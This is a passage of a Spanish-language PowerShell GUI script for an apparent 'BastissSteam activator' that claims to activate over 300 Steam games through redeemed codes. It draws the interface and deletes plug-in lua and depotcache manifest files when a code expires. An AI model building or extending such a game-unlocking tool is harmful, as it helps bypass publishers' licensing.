$ig.FillEllipse($igBrush, 2, 2, 28, 28)
$igPen = New-Object System.Drawing.Pen($White, 2)
$ig.DrawEllipse($igPen, 18, 16, 8, 8)
$ig.DrawLine($igPen, 10, 10, 22, 20)
$ig.FillEllipse([System.Drawing.Brushes]::White, 8, 8, 5, 5)
$igBrush.Dispose(); $igPen.Dispose(); $ig.Dispose()
$form.Icon = [System.Drawing.Icon]::FromHandle($iconBmp.GetHicon())

# Apply dark title bar on shown
$form.Add_HandleCreated({
    $val = [int]1
    [DwmHelper]::DwmSetWindowAttribute($form.Handle, 20, [ref]$val, 4) | Out-Null
})

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  HEADER PANEL (Logo + Title)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
$headerPanel = New-Object BufferedPanel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size($FORM_W, $HEADER_H)
$headerPanel.BackColor = $BG

$headerPanel.Add_Paint({
    param($s, $e)
    $g = $e.Graphics
    $g.SmoothingMode = 'AntiAlias'
    $g.TextRenderingHint = 'ClearTypeGridFit'

    $logoSize = 78
    $logoX = 110
    $logoY = 18

    $logoRect = New-Object System.Drawing.Rectangle($logoX, $logoY, $logoSize, $logoSize)
    $lgBrush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
        $logoRect,
        [System.Drawing.Color]::FromArgb(40, 130, 230),
        [System.Drawing.Color]::FromArgb(15, 70, 160),
        [System.Drawing.Drawing2D.LinearGradientMode]::ForwardDiagonal
    )
    $g.FillEllipse($lgBrush, $logoRect)
    $lgBrush.Dispose()

    $cx = $logoX + $logoSize / 2
    $cy = $logoY + $logoSize / 2
    $wPen = New-Object System.Drawing.Pen($White, 2.5)

    $jointX = $cx - 14
    $jointY = $cy - 12
    $g.FillEllipse([System.Drawing.Brushes]::White, $jointX - 4, $jointY - 4, 8, 8)

    $gearCX = $cx + 10
    $gearCY = $cy + 12
    $g.DrawLine($wPen, $jointX, $jointY, $gearCX, $gearCY)

    $gearR = 11
    $g.DrawEllipse($wPen, $gearCX - $gearR, $gearCY - $gearR, $gearR * 2, $gearR * 2)
    $g.FillEllipse([System.Drawing.Brushes]::White, $gearCX - 3, $gearCY - 3, 6, 6)

    $toothPen = New-Object System.Drawing.Pen($White, 2)
    for ($i = 0; $i -lt 8; $i++) {
        $angle = $i * 45 * [Math]::PI / 180
        $ix = $gearCX + ($gearR - 2) * [Math]::Cos($angle)
        $iy = $gearCY + ($gearR - 2) * [Math]::Sin($angle)
        $ox = $gearCX + ($gearR + 3) * [Math]::Cos($angle)
        $oy = $gearCY + ($gearR + 3) * [Math]::Sin($angle)
        $g.DrawLine($toothPen, [float]$ix, [float]$iy, [float]$ox, [float]$oy)
    }
    $toothPen.Dispose()

    $arcPen = New-Object System.Drawing.Pen($White, 2.5)
    $g.DrawArc($arcPen, $jointX - 18, $jointY - 22, 36, 36, 300, 120)
    $arcPen.Dispose()
    $wPen.Dispose()

    $titleX = $logoX + $logoSize + 12
    $titleY = 30

    $whiteBrush = New-Object System.Drawing.SolidBrush($script:White)
    $bastissSize = $g.MeasureString("Bastiss", $script:FntTitleBig)
    $g.DrawString("Bastiss", $script:FntTitleBig, $whiteBrush, $titleX, $titleY)

    $greenBrush = New-Object System.Drawing.SolidBrush($script:Green)
    $steamX = $titleX + $bastissSize.Width - 8
    $g.DrawString("Steam", $script:FntTitleBig, $greenBrush, $steamX, $titleY)

    $activatorText = "a  c  t  i  v  a  t  o  r"
    $grayBrush = New-Object System.Drawing.SolidBrush($script:Gray)
    $actSize = $g.MeasureString($activatorText, $script:FntActivator)

    $groupCenterX = $logoX + ($logoSize + 12 + $bastissSize.Width - 8 + $g.MeasureString("Steam", $script:FntTitleBig).Width) / 2
    $actX = $groupCenterX - $actSize.Width / 2 + 40
    $g.DrawString($activatorText, $script:FntActivator, $grayBrush, $actX, $titleY + $bastissSize.Height - 5)

    $whiteBrush.Dispose()
    $greenBrush.Dispose()
    $grayBrush.Dispose()
})
$form.Controls.Add($headerPanel)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  STATUS BAR PANEL (dynamic)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
$script:statusPanel = New-Object BufferedPanel
$script:statusPanel.Location = New-Object System.Drawing.Point($PAD, $STATUS_Y)
$script:statusPanel.Size = New-Object System.Drawing.Size($CONTENT_W, $STATUS_H)
$script:statusPanel.BackColor = $BG

$script:statusPanel.Add_Paint({
    param($s, $e)
    $g = $e.Graphics
    $g.SmoothingMode = 'AntiAlias'
    $g.TextRenderingHint = 'ClearTypeGridFit'

    $path = New-RoundedRect 0 0 ($s.Width - 1) ($s.Height - 1) 8
    $bgBr = New-Object System.Drawing.SolidBrush($script:CardBG)
    $borderPen = New-Object System.Drawing.Pen($script:CardBorder, 1)
    $g.FillPath($bgBr, $path)
    $g.DrawPath($borderPen, $path)
    $bgBr.Dispose(); $borderPen.Dispose(); $path.Dispose()

    $blueBr = New-Object System.Drawing.SolidBrush($script:Blue)
    $g.FillRectangle($blueBr, 15, 13, 14, 14)
    $blueBr.Dispose()

    $wBr = New-Object System.Drawing.SolidBrush($script:White)
    $g.DrawString("Estado:", [System.Windows.Forms.Control]::DefaultFont, $wBr, 36, 10)
    $wBr.Dispose()

    # Dynamic status text
    $stBr = New-Object System.Drawing.SolidBrush($script:dynStatusColor)
    $estadoSize = $g.MeasureString("Estado:", [System.Windows.Forms.Control]::DefaultFont)
    $g.DrawString($script:dynStatusText, $script:FntStatusBold, $stBr, 36 + $estadoSize.Width - 2, 10)
    $stBr.Dispose()

    # Show countdown if active
    if ($script:countdownText) {
        $yBr = New-Object System.Drawing.SolidBrush($script:Yellow)
        $cdSize = $g.MeasureString($script:countdownText, $script:FntStatusBold)
        $cdX = $s.Width - 18 - $cdSize.Width
        $g.DrawString($script:countdownText, $script:FntStatusBold, $yBr, $cdX, 10)

        $starX = $cdX - 22
        $starY = 12
        $starSize = 16
        $starPath = New-Object System.Drawing.Drawing2D.GraphicsPath
        $starPoints = @()
        for ($i = 0; $i -lt 10; $i++) {
            $angle = ($i * 36 - 90) * [Math]::PI / 180
            $r2 = if ($i % 2 -eq 0) { $starSize / 2 } else { $starSize / 4.5 }
            $px = $starX + $starSize / 2 + $r2 * [Math]::Cos($angle)
            $py = $starY + $starSize / 2 + $r2 * [Math]::Sin($angle)
            $starPoints += New-Object System.Drawing.PointF($px, $py)
        }
        $starPath.AddPolygon($starPoints)
        $g.FillPath($yBr, $starPath)
        $starPath.Dispose()
        $yBr.Dispose()
    }
})
$form.Controls.Add($script:statusPanel)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  CARD BUTTON FACTORY
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function New-CardPanel {
    param(
        [int]$X, [int]$Y, [int]$W, [int]$H,
        [string]$Title, [string]$Subtitle,
        [string]$IconType,
        [scriptblock]$ClickAction
    )

    $panel = New-Object BufferedPanel
    $panel.Location = New-Object System.Drawing.Point($X, $Y)
    $panel.Size = New-Object System.Drawing.Size($W, $H)
    $panel.BackColor = $BG
    $panel.Cursor = [System.Windows.Forms.Cursors]::Hand
    $panel.Tag = @{ Hover = $false; IconType = $IconType; Title = $Title; Subtitle = $Subtitle }

    $panel.Add_MouseEnter({
        param($s2, $e2)
        $s2.Tag.Hover = $true; $s2.Invalidate()
    })
    $panel.Add_MouseLeave({
        param($s2, $e2)
        $s2.Tag.Hover = $false; $s2.Invalidate()
    })

    if ($ClickAction) { $panel.Add_Click($ClickAction) }

    $panel.Add_Paint({
        param($s, $e)
        $g = $e.Graphics
        $g.SmoothingMode = 'AntiAlias'
        $g.TextRenderingHint = 'ClearTypeGridFit'

        $info = $s.Tag
        $bgCol = if ($info.Hover) { $script:CardHover } else { $script:CardBG }

        $path = New-RoundedRect 0 0 ($s.Width - 1) ($s.Height - 1) $script:CORNER_R
        $bgBr = New-Object System.Drawing.SolidBrush($bgCol)
        $borderPen = New-Object System.Drawing.Pen($script:CardBorder, 1)
        $g.FillPath($bgBr, $path)
        $g.DrawPath($borderPen, $path)
        $bgBr.Dispose(); $borderPen.Dispose(); $path.Dispose()

        $iconAreaW = 60
        $textX = $iconAreaW + 8
        $titleY2 = [int](($s.Height / 2) - 22)
        $subY2   = [int](($s.Height / 2) + 4)
        $iconCX = 38
        $iconCY = [int]($s.Height / 2)

        switch ($info.IconType) {
            "lightning" {
                $lPen = New-Object System.Drawing.Pen($script:Cyan, 3)
                $g.DrawLines($lPen, @(
                    (New-Object System.Drawing.PointF(($iconCX + 2), ($iconCY - 20))),
                    (New-Object System.Drawing.PointF(($iconCX - 6), ($iconCY - 1))),
                    (New-Object System.Drawing.PointF(($iconCX + 3), ($iconCY - 1))),
                    (New-Object System.Drawing.PointF(($iconCX - 4), ($iconCY + 20)))
                ))
                $lPen.Dispose()
            }
            "upload" {
                $boxPen = New-Object System.Drawing.Pen($script:Cyan, 2)
                $boxPath = New-RoundedRect ($iconCX - 16) ($iconCY - 16) 32 32 6
                $g.DrawPath($boxPen, $boxPath); $boxPath.Dispose()
                $arrPen = New-Object System.Drawing.Pen($script:Cyan, 2.5)
                $g.DrawLine($arrPen, $iconCX, ($iconCY - 8), $iconCX, ($iconCY + 8))
                $g.DrawLine($arrPen, ($iconCX - 6), ($iconCY - 2), $iconCX, ($iconCY - 8))
                $g.DrawLine($arrPen, ($iconCX + 6), ($iconCY - 2), $iconCX, ($iconCY - 8))
                $boxPen.Dispose(); $arrPen.Dispose()
            }
            "globe" {
                $gPen = New-Object System.Drawing.Pen($script:Cyan, 1.8)
                $g.DrawEllipse($gPen, ($iconCX - 15), ($iconCY - 15), 30, 30)
                $g.DrawLine($gPen, $iconCX, ($iconCY - 15), $iconCX, ($iconCY + 15))
                $g.DrawLine($gPen, ($iconCX - 15), $iconCY, ($iconCX + 15), $iconCY)
                $g.DrawEllipse($gPen, ($iconCX - 8), ($iconCY - 15), 16, 30)
                $g.DrawArc($gPen, ($iconCX - 15), ($iconCY - 8), 30, 10, 0, 180)
                $g.DrawArc($gPen, ($iconCX - 15), ($iconCY - 2), 30, 10, 180, 180)
                $gPen.Dispose()
            }
            "trash" {
                $tPen = New-Object System.Drawing.Pen($script:Cyan, 2)
                $g.DrawLine($tPen, ($iconCX - 13), ($iconCY - 12), ($iconCX + 13), ($iconCY - 12))
                $g.DrawLine($tPen, ($iconCX - 4), ($iconCY - 12), ($iconCX - 4), ($iconCY - 16))
                $g.DrawLine($tPen, ($iconCX + 4), ($iconCY - 12), ($iconCX + 4), ($iconCY - 16))
                $g.DrawLine($tPen, ($iconCX - 4), ($iconCY - 16), ($iconCX + 4), ($iconCY - 16))
                $g.DrawLine($tPen, ($iconCX - 11), ($iconCY - 10), ($iconCX - 9), ($iconCY + 16))
                $g.DrawLine($tPen, ($iconCX + 11), ($iconCY - 10), ($iconCX + 9), ($iconCY + 16))
                $g.DrawLine($tPen, ($iconCX - 9), ($iconCY + 16), ($iconCX + 9), ($iconCY + 16))
                $thinPen = New-Object System.Drawing.Pen($script:Cyan, 1.5)
                $g.DrawLine($thinPen, $iconCX, ($iconCY - 6), $iconCX, ($iconCY + 12))
                $g.DrawLine($thinPen, ($iconCX - 5), ($iconCY - 6), ($iconCX - 5), ($iconCY + 12))
                $g.DrawLine($thinPen, ($iconCX + 5), ($iconCY - 6), ($iconCX + 5), ($iconCY + 12))
                $tPen.Dispose(); $thinPen.Dispose()
            }
            "discord" {
                $dBrush = New-Object System.Drawing.SolidBrush($script:DiscordBlue)
                $dPath = New-RoundedRect ($iconCX - 18) ($iconCY - 15) 36 30 10
                $g.FillPath($dBrush, $dPath); $dPath.Dispose()
                $eyeBr = New-Object System.Drawing.SolidBrush($script:White)
                $g.FillEllipse($eyeBr, ($iconCX - 11), ($iconCY - 7), 9, 10)
                $g.FillEllipse($eyeBr, ($iconCX + 2), ($iconCY - 7), 9, 10)
                $eyeBr.Dispose(); $dBrush.Dispose()
                $dBr2 = New-Object System.Drawing.SolidBrush($script:DiscordBlue)
                $g.FillPolygon($dBr2, @(
                    (New-Object System.Drawing.PointF(($iconCX - 14), ($iconCY + 12))),
                    (New-Object System.Drawing.PointF(($iconCX - 8), ($iconCY + 12))),
                    (New-Object System.Drawing.PointF(($iconCX - 10), ($iconCY + 20)))
                ))
                $g.FillPolygon($dBr2, @(
                    (New-Object System.Drawing.PointF(($iconCX + 14), ($iconCY + 12))),
                    (New-Object System.Drawing.PointF(($iconCX + 8), ($iconCY + 12))),
                    (New-Object System.Drawing.PointF(($iconCX + 10), ($iconCY + 20)))
                ))
                $dBr2.Dispose()
            }
            "tiktok" {
                $ttPen = New-Object System.Drawing.Pen($script:White, 3)
                $g.DrawLine($ttPen, ($iconCX + 2), ($iconCY - 18), ($iconCX + 2), ($iconCY + 10))
                $ttPen.Dispose()
                $noteBr = New-Object System.Drawing.SolidBrush($script:TikPink)
                $g.FillEllipse($noteBr, ($iconCX - 10), ($iconCY + 4), 14, 12)
                $noteBr.Dispose()
                $cyanBr = New-Object System.Drawing.SolidBrush($script:Cyan)
                $g.FillEllipse($cyanBr, ($iconCX - 8), ($iconCY + 6), 14, 12)
                $cyanBr.Dispose()
                $curlPen = New-Object System.Drawing.Pen($script:TikPink, 2.5)
                $g.DrawArc($curlPen, ($iconCX), ($iconCY - 22), 18, 14, 270, 90)
                $curlPen.Dispose()
            }
            "exit" {
                $ePen = New-Object System.Drawing.Pen($script:Cyan, 2)
                $g.DrawLine($ePen, ($iconCX - 8), ($iconCY - 12), ($iconCX - 8), ($iconCY + 12))
                $g.DrawLine($ePen, ($iconCX - 8), ($iconCY - 12), ($iconCX + 2), ($iconCY - 12))
                $g.DrawLine($ePen, ($iconCX - 8), ($iconCY + 12), ($iconCX + 2), ($iconCY + 12))
                $g.DrawLine($ePen, ($iconCX), $iconCY, ($iconCX + 14), $iconCY)
                $g.DrawLine($ePen, ($iconCX + 10), ($iconCY - 5), ($iconCX + 14), $iconCY)
                $g.DrawLine($ePen, ($iconCX + 10), ($iconCY + 5), ($iconCX + 14), $iconCY)
                $ePen.Dispose()
            }
        }

        $titleBr = New-Object System.Drawing.SolidBrush($script:White)
        $g.DrawString($info.Title, $script:FntCardTitle, $titleBr, $textX, $titleY2)
        $titleBr.Dispose()

        if ($info.Subtitle) {
            $subBr = New-Object System.Drawing.SolidBrush($script:Gray)
            $g.DrawString($info.Subtitle, $script:FntCardSub, $subBr, $textX, $subY2)
            $subBr.Dispose()
        }

        $arrowBr = New-Object System.Drawing.SolidBrush($script:Cyan)
        $arrowSize = $g.MeasureString(">", $script:FntArrow)
        $g.DrawString(">", $script:FntArrow, $arrowBr, $s.Width - $arrowSize.Width - 12, ($s.Height - $arrowSize.Height) / 2)
        $arrowBr.Dispose()
    })

    return $panel
}

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  CREATE CARD BUTTONS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

# ---- Row 1: Activar | Actualizar ----
$activarPanel = New-CardPanel -X $PAD -Y $ROW1_Y -W $HALF_W -H $CARD_H `
    -Title "Activar +300" -Subtitle "Activa m\u00e1s de 300 juegos" `
    -IconType "lightning" -ClickAction {
        Show-CodeRedemptionDialog
    }
$form.Controls.Add($activarPanel)

$actualizarPanel = New-CardPanel -X ($PAD + $HALF_W + $CARD_GAP) -Y $ROW1_Y -W $HALF_W -H $CARD_H `
    -Title "Actualizar" -Subtitle "Opciones y PC ID" `
    -IconType "upload" -ClickAction {
        Show-MenuDialog
    }
$form.Controls.Add($actualizarPanel)

# ---- Row 2: Idioma | Desinstalar ----
$idiomaPanel = New-CardPanel -X $PAD -Y $ROW2_Y -W $HALF_W -H $CARD_H `
    -Title "Idioma" -Subtitle "Cambiar idioma" `
    -IconType "globe" -ClickAction {
        [System.Windows.Forms.MessageBox]::Show("Idioma: Espa\u00f1ol (por defecto)", "Idioma", "OK", "Information")
    }
$form.Controls.Add($idiomaPanel)

$desinstalarPanel = New-CardPanel -X ($PAD + $HALF_W + $CARD_GAP) -Y $ROW2_Y -W $HALF_W -H $CARD_H `
    -Title "Desinstalar" -Subtitle "Eliminar todos los fixes" `
    -IconType "trash" -ClickAction {
        Show-UninstallDialog
    }
$form.Controls.Add($desinstalarPanel)

# ---- Discord ----
$discordPanel = New-CardPanel -X $PAD -Y $DISCORD_Y -W $CONTENT_W -H $FULL_CARD_H `
    -Title "Discord" -Subtitle "\u00danete a nuestro servidor" `
    -IconType "discord" -ClickAction {
        try { Start-Process "https://discord.gg/bastiss" } catch {}
    }
$form.Controls.Add($discordPanel)

# ---- TikTok ----
$tiktokPanel = New-CardPanel -X $PAD -Y $TIKTOK_Y -W $CONTENT_W -H $FULL_CARD_H `
    -Title "TikTok" -Subtitle "S\u00edguenos en TikTok" `
    -IconType "tiktok" -ClickAction {
        try { Start-Process "https://tiktok.com/@bastiss" } catch {}
    }
$form.Controls.Add($tiktokPanel)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  TIMERS SECTION
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
$timersGroup = New-Object BufferedPanel
$timersGroup.Location = New-Object System.Drawing.Point($PAD, $TIMERS_Y)
$timersGroup.Size = New-Object System.Drawing.Size($CONTENT_W, $TIMERS_H)
$timersGroup.BackColor = $BG

$timersGroup.Add_Paint({
    param($s, $e)
    $g = $e.Graphics
    $g.SmoothingMode = 'AntiAlias'
    $path = New-RoundedRect 0 0 ($s.Width - 1) ($s.Height - 1) 8
    $bgBr = New-Object System.Drawing.SolidBrush($script:CardBG)
    $borderPen = New-Object System.Drawing.Pen($script:CardBorder, 1)
    $g.FillPath($bgBr, $path)
    $g.DrawPath($borderPen, $path)
    $bgBr.Dispose(); $borderPen.Dispose(); $path.Dispose()
    $g.DrawString("C\u00f3digos Activos", $script:FntSmall, [System.Drawing.Brushes]::DimGray, 12, 6)
})

$lblActivos = New-Object System.Windows.Forms.Label
$lblActivos.Text = ""
$lblActivos.ForeColor = [System.Drawing.Color]::DimGray
$lblActivos.Size = New-Object System.Drawing.Size($CONTENT_W - 24, 12)
$lblActivos.Location = New-Object System.Drawing.Point(12, 6)
$lblActivos.Font = $script:FntSmall
$lblActivos.Visible = $false
$timersGroup.Controls.Add($lblActivos)

$lstTimers = New-Object System.Windows.Forms.ListBox
$lstTimers.Size = New-Object System.Drawing.Size($CONTENT_W - 24, 52)
$lstTimers.Location = New-Object System.Drawing.Point(12, 20)
$lstTimers.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
$lstTimers.ForeColor = [System.Drawing.Color]::FromArgb(0, 180, 230)
$lstTimers.BorderStyle = "FixedSingle"
$lstTimers.Font = $script:FntSmall
$lstTimers.Visible = $false
$timersGroup.Controls.Add($lstTimers)

$btnExpirar = New-Object System.Windows.Forms.Button
$btnExpirar.Text = "Expirar"
$btnExpirar.Size = New-Object System.Drawing.Size(80, 24)
$btnExpirar.Location = New-Object System.Drawing.Point($CONTENT_W - 100, 78)
$btnExpirar.BackColor = [System.Drawing.Color]::FromArgb(139, 0, 0)
$btnExpirar.ForeColor = [System.Drawing.Color]::White
$btnExpirar.FlatStyle = "Flat"
$btnExpirar.Font = $script:FntSmall
$btnExpirar.Visible = $false
$btnExpirar.Add_Click({
    if ($lstTimers.SelectedItem -eq $null) { [System.Windows.Forms.MessageBox]::Show("Selecciona un codigo de la lista primero.", "Aviso", "OK", "Information"); return }
    $sel = $lstTimers.SelectedItem.ToString()
    $gameName = ($sel -split ' - ')[0]
    $timers = Get-ActiveTimers
    $timer = $timers | Where-Object { $_.game_name -eq $gameName }
    if (-not $timer) { return }
    $resp = [System.Windows.Forms.MessageBox]::Show("Expirar codigo de $gameName?`nLos juegos se eliminaran permanentemente.", "Confirmar", "YesNo", "Warning")
    if ($resp -ne "Yes") { return }
    $root = $timer.steam_root
    foreach ($f in $timer.lua_files) { Remove-FileHard (Join-Path (Join-Path $root "config\stplug-in") $f); Remove-FileHard (Join-Path (Join-Path $root "config\lua") $f) }
    foreach ($f in $timer.manifest_files) { Remove-FileHard (Join-Path (Join-Path $root "config\depotcache") $f) }
    $remaining = $timers | Where-Object { $_.game_name -ne $gameName }
    Save-Timers $remaining
    Update-TimersList
    Set-Status "C\u00f3digo expirado: $gameName" $script:Red
})
$timersGroup.Controls.Add($btnExpirar)

$form.Controls.Add($timersGroup)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  SALIR BUTTON
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
$salirPanel = New-Object BufferedPanel
$salirPanel.Location = New-Object System.Drawing.Point($PAD, $SALIR_Y)
$salirPanel.Size = New-Object System.Drawing.Size($CONTENT_W, $SALIR_H)
$salirPanel.BackColor = $BG
$salirPanel.Cursor = [System.Windows.Forms.Cursors]::Hand
$salirPanel.Tag = @{ Hover = $false }

$salirPanel.Add_MouseEnter({ param($s2, $e2) $s2.Tag.Hover = $true; $s2.Invalidate() })
$salirPanel.Add_MouseLeave({ param($s2, $e2) $s2.Tag.Hover = $false; $s2.Invalidate() })
$salirPanel.Add_Click({ $form.Close() })

$salirPanel.Add_Paint({
    param($s, $e)
    $g = $e.Graphics
    $g.SmoothingMode = 'AntiAlias'
    $g.TextRenderingHint = 'ClearTypeGridFit'

    $bgCol = if ($s.Tag.Hover) { $script:CardHover } else { $script:CardBG }
    $path = New-RoundedRect 0 0 ($s.Width - 1) ($s.Height - 1) $script:CORNER_R
    $bgBr = New-Object System.Drawing.SolidBrush($bgCol)
    $borderPen = New-Object System.Drawing.Pen($script:CardBorder, 1)
    $g.FillPath($bgBr, $path)
    $g.DrawPath($borderPen, $path)
    $bgBr.Dispose(); $borderPen.Dispose(); $path.Dispose()

    $ePen = New-Object System.Drawing.Pen($script:Cyan, 2)
    $eCX = ($s.Width / 2) - 30
    $eCY = $s.Height / 2
    $g.DrawLine($ePen, ($eCX - 8), ($eCY - 10), ($eCX - 8), ($eCY + 10))
    $g.DrawLine($ePen, ($eCX - 8), ($eCY - 10), ($eCX + 0), ($eCY - 10))
    $g.DrawLine($ePen, ($eCX - 8), ($eCY + 10), ($eCX + 0), ($eCY + 10))
    $g.DrawLine($ePen, ($eCX + 2), $eCY, ($eCX + 14), $eCY)
    $g.DrawLine($ePen, ($eCX + 10), ($eCY - 4), ($eCX + 14), $eCY)
    $g.DrawLine($ePen, ($eCX + 10), ($eCY + 4), ($eCX + 14), $eCY)
    $ePen.Dispose()

    $titleBr = New-Object System.Drawing.SolidBrush($script:White)
    $salirSize = $g.MeasureString("Salir", $script:FntSalir)
    $g.DrawString("Salir", $script:FntSalir, $titleBr, ($s.Width / 2) - ($salirSize.Width / 2) + 10, ($s.Height - $salirSize.Height) / 2)
    $titleBr.Dispose()
})
$form.Controls.Add($salirPanel)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  DIALOG FUNCTIONS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function Show-CodeRedemptionDialog {
    $dlg = New-Object System.Windows.Forms.Form
    $dlg.Text = "Canjear Codigo"
    $dlg.Size = New-Object System.Drawing.Size(420, 280)
    $dlg.StartPosition = "CenterParent"
    $dlg.BackColor = [System.Drawing.Color]::FromArgb(11, 15, 25)
    $dlg.ForeColor = [System.Drawing.Color]::White
    $dlg.FormBorderStyle = "FixedDialog"
    $dlg.ShowInTaskbar = $false
    $dlg.MaximizeBox = $false
    $dlg.MinimizeBox = $false

    $lblPc = New-Object System.Windows.Forms.Label
    $lblPc.Text = "PC ID: $script:clientId"
    $lblPc.ForeColor = [System.Drawing.Color]::FromArgb(0, 180, 230)
    $lblPc.Size = New-Object System.Drawing.Size(380, 16)
    $lblPc.Location = New-Object System.Drawing.Point(20, 15)
    $lblPc.TextAlign = "MiddleCenter"
    $lblPc.Font = Get-SafeFont "Consolas" 8
    $dlg.Controls.Add($lblPc)

    $lblInfo = New-Object System.Windows.Forms.Label
    $lblInfo.Text = "Pega tu codigo aqui:"
    $lblInfo.ForeColor = [System.Drawing.Color]::FromArgb(130, 142, 162)
    $lblInfo.Size = New-Object System.Drawing.Size(380, 20)
    $lblInfo.Location = New-Object System.Drawing.Point(20, 40)
    $dlg.Controls.Add($lblInfo)

    $txtCode = New-Object System.Windows.Forms.TextBox
    $txtCode.Size = New-Object System.Drawing.Size(370, 24)
    $txtCode.Location = New-Object System.Drawing.Point(25, 65)
    $txtCode.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
    $txtCode.ForeColor = [System.Drawing.Color]::FromArgb(0, 180, 230)
    $txtCode.Font = Get-SafeFont "Consolas" 10
    $txtCode.BorderStyle = "FixedSingle"
    $dlg.Controls.Add($txtCode)

    $pb = New-Object System.Windows.Forms.ProgressBar
    $pb.Size = New-Object System.Drawing.Size(370, 20)
    $pb.Location = New-Object System.Drawing.Point(25, 98)
    $pb.Style = "Continuous"
    $pb.ForeColor = [System.Drawing.Color]::FromArgb(0, 180, 230)
    $pb.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
    $pb.Value = 0
    $pb.Visible = $false
    $dlg.Controls.Add($pb)

    $lblStatus = New-Object System.Windows.Forms.Label
    $lblStatus.Text = ""
    $lblStatus.ForeColor = [System.Drawing.Color]::FromArgb(60, 220, 100)
    $lblStatus.Size = New-Object System.Drawing.Size(370, 20)
    $lblStatus.Location = New-Object System.Drawing.Point(25, 122)
    $lblStatus.TextAlign = "MiddleCenter"
    $lblStatus.Font = Get-SafeFont "Segoe UI" 9 ([System.Drawing.FontStyle]::Bold)
    $lblStatus.Visible = $false
    $dlg.Controls.Add($lblStatus)

    $btnCanjear = New-Object System.Windows.Forms.Button
    $btnCanjear.Text = "CANJEAR"
    $btnCanjear.Size = New-Object System.Drawing.Size(160, 38)
    $btnCanjear.Location = New-Object System.Drawing.Point(130, 155)
    $btnCanjear.BackColor = [System.Drawing.Color]::FromArgb(25, 100, 200)
    $btnCanjear.ForeColor = [System.Drawing.Color]::White
    $btnCanjear.FlatStyle = "Flat"
    $btnCanjear.Font = Get-SafeFont "Segoe UI" 10 ([System.Drawing.FontStyle]::Bold)

    $btnCanjear.Add_Click({
